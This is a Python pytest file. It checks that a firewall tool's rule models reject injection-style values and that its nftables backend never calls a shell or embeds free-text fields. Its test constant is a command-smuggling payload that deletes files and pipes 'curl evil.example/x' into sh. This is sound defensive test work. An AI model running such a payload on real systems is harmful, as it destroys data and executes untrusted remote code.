"""Injection-style candidate rules and nftables shell-safety (spec §20, §24, CLAUDE.md).

Two independent guarantees, tested separately:

1. Garbage/oversized values in fields that actually reach nftables
   (source, destination, protocol, ports) can never even become a
   `CandidateRule` — Pydantic rejects them before validation ever runs.
2. `pirewall.firewall.backend.nftables` never builds a shell string from
   rule data: every `subprocess.run` call is an argument list with
   `shell` never `True`, and free-text fields (`reason`, `evidence`,
   `metadata`) never appear anywhere in the JSON payload sent to `nft`.
"""

import json
from datetime import UTC, datetime
from unittest.mock import MagicMock, patch

import pytest
from pydantic import ValidationError

from pirewall.core.enums import FirewallAction, Protocol, RuleDirection, RuleStatus
from pirewall.core.models.rule import CandidateRule, FirewallRule
from pirewall.firewall.backend.nftables import NftablesBackend

NOW = datetime(2026, 1, 1, tzinfo=UTC)
MALICIOUS_PAYLOAD = '"; rm -rf / #`$(curl evil.example/x|sh)`'


def _base_candidate_fields() -> dict[str, object]:
    return {
        "decision_id": "decision-1",
        "action": FirewallAction.BLOCK,
        "direction": RuleDirection.INBOUND,
        "source": "203.0.113.5/32",
        "destination": "192.168.1.10/32",
        "protocol": Protocol.TCP,
        "destination_port": 443,
        "reason": "test",
        "threat_score": 90.0,
        "created_at": NOW,
    }


@pytest.mark.parametrize(
    "field,bad_value",
    [
        ("source", "not-a-network"),
        ("source", MALICIOUS_PAYLOAD),
        ("destination", MALICIOUS_PAYLOAD),
        ("destination_port", 999999),
        ("destination_port", -1),
        ("protocol", MALICIOUS_PAYLOAD),
        ("action", MALICIOUS_PAYLOAD),
    ],
)
def test_garbage_in_network_relevant_fields_rejected_at_construction(field: str, bad_value: object) -> None:
    fields = _base_candidate_fields()
    fields[field] = bad_value
    with pytest.raises(ValidationError):
        CandidateRule.model_validate(fields)


def test_oversized_source_network_string_rejected() -> None:
    fields = _base_candidate_fields()
    fields["source"] = "203.0.113.5/32" + ("A" * 10_000)
    with pytest.raises(ValidationError):
        CandidateRule.model_validate(fields)


def _make_rule_with_malicious_free_text() -> FirewallRule:
    return FirewallRule.model_validate(
        {
            "id": "rule-1",
            "action": FirewallAction.BLOCK,
            "direction": RuleDirection.INBOUND,
            "source": "203.0.113.5/32",
            "destination": "192.168.1.10/32",
            "protocol": Protocol.TCP,
            "destination_port": 22,
            "reason": MALICIOUS_PAYLOAD,
            "evidence": (MALICIOUS_PAYLOAD,),
            "threat_score": 90.0,
            "priority": 10,
            "status": RuleStatus.ACTIVE,
            "created_at": NOW,
            "metadata": {"note": MALICIOUS_PAYLOAD},
        }
    )


def test_nftables_backend_never_embeds_free_text_fields_in_payload() -> None:
    """`reason`/`evidence`/`metadata` must never appear in the JSON handed to `nft`."""
    rule = _make_rule_with_malicious_free_text()

    captured_payloads: list[str] = []

    def fake_run(*args: object, **kwargs: object) -> MagicMock:
        stdin = kwargs.get("input")
        if isinstance(stdin, str):
            captured_payloads.append(stdin)
        result = MagicMock()
        result.stdout = json.dumps({"nftables": []})
        return result

    backend = NftablesBackend(rate_limit_per_second=10)
    with patch("subprocess.run", side_effect=fake_run) as mock_run:
        backend.apply_rule(rule)

    assert captured_payloads, "expected at least one nft JSON payload to be captured"
    for payload in captured_payloads:
        assert MALICIOUS_PAYLOAD not in payload

    for call in mock_run.call_args_list:
        args, kwargs = call
        assert isinstance(args[0], list), "subprocess.run must be called with an argument list"
        assert kwargs.get("shell", False) is False


def test_nftables_backend_never_calls_subprocess_with_shell_true() -> None:
    rule = _make_rule_with_malicious_free_text()
    backend = NftablesBackend(rate_limit_per_second=10)

    def fake_run(*args: object, **kwargs: object) -> MagicMock:
        assert kwargs.get("shell") is not True
        result = MagicMock()
        result.stdout = json.dumps({"nftables": []})
        return result

    with patch("subprocess.run", side_effect=fake_run):
        backend.apply_rule(rule)
        backend.remove_rule(rule.id)
        backend.list_active_rule_ids()
        backend.health_check()
